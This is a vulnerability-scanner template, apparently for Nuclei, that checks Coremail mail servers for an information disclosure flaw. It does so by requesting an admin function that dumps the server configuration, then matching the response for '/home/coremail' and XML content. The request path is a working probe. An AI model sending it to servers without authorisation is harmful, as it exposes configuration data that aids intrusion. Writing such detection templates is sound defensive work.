id: coremail-mailsms-info-disclosure
info:
  name: Coremail Mailsms Information Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  tags: information-disclosure
http:
  - method: GET
    path:
      - "{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/home/coremail"
      - type: word
        part: body
        words:
          - "<?xml"
